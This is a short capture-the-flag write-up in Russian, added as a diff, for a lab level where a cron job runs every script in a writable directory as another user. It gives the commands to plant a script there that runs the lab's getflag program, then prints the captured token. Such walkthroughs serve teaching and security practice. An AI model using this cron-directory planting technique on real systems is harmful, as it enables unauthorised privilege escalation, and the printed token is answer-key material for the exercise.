@@ -1,0 +1,24 @@
+You have new mail.
+	==> /var/mail/level05
+1) cat /var/mail/level05 
+
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+Запись из crontab, говорящая о том, что каждые 2 минуты выполняется скрипт sh /usr/sbin/openarenaserver
+2)  cat /usr/sbin/openarenaserver
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+Данный скрипт говорит о том, что он выполняет все файл из /opt/openarenaserver/
+
+3) Можем воспользоваться этим, подкинув нужный файл в данную директорию
+echo "/bin/getflag > /tmp/openserver" > /opt/openarenaserver/getflag
+
+4) По истечению 2-х минут
+cat /tmp/openserver
+
+Check flag.Here is your token : viuaaale9huek52boumoomioc
